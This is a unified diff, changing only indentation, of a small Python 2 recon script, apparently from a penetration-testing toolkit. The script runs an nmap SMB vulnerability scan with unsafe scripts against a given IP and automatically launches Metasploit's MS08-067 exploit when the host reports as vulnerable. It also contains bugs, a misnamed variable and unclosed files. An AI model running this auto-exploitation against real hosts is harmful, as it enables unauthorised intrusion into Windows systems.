@@ -3,13 +3,13 @@ import sys
 import subprocess
 
 def main(args):
-    if len(args) != 2:
-        print("Usage: smbrecon.py <ip address>")
-        sys.exit(0)
+	if len(args) != 2:
+		print("Usage: smbrecon.py <ip address>")
+		sys.exit(0)
 
-    ip = args[1]
-    
-    if 1==0:
+	ip = args[1]
+	
+	if 1==0:
 		print("INFO: Starting nbtscan on " + ip)
 		NBTSCAN = "nbtscan -r %s" % (ip)
 		nbtresults = subprocess.check_output(NBTSCAN, shell=True)
@@ -30,25 +30,25 @@ def main(args):
 			f.write(nbtresults)
 			f.close
 
-    print("INFO: Running nmap smb vuln scan on " + ip)
-    NBTSCAN = "nmap -vv -Pn -n --open -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 %s" % (ip)
-    nbtresults = subprocess.check_output(NBTSCAN, shell=True)
-    lines = nbtresults.split("\n")
-    for line in lines:
-        print line
-        if "VULNERABLE" in line and "NOT VULNERABLE" not in line:
-            print('FOUND SMB VULN on ' +ip+ ": " +line)
-        if "MS08-067:" in Line and "Vulnerable" in line and "NOT" not in line:
-            print("Exploiting MS08-067")
-            cmd = "gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi RHOST=" + ip + " E"
-            subprocess.call(cmd.split(" "))
-    resultsfile = "discovery/smb/" + ip + "_nse.txt"
-    f = open(resultsfile, "w")
-    f.write(nbtresults)
-    f.close
+	print("INFO: Running nmap smb vuln scan on " + ip)
+	NBTSCAN = "nmap -vv -Pn -n --open -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 %s" % (ip)
+	nbtresults = subprocess.check_output(NBTSCAN, shell=True)
+	lines = nbtresults.split("\n")
+	for line in lines:
+		print line
+		if "VULNERABLE" in line and "NOT VULNERABLE" not in line:
+			print('FOUND SMB VULN on ' +ip+ ": " +line)
+		if "MS08-067:" in Line and "Vulnerable" in line and "NOT" not in line:
+			print("Exploiting MS08-067")
+			cmd = "gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi RHOST=" + ip + " E"
+			subprocess.call(cmd.split(" "))
+	resultsfile = "discovery/smb/" + ip + "_nse.txt"
+	f = open(resultsfile, "w")
+	f.write(nbtresults)
+	f.close
 
 if __name__=='__main__':
-    main(sys.argv)
+	main(sys.argv)
 
 
 
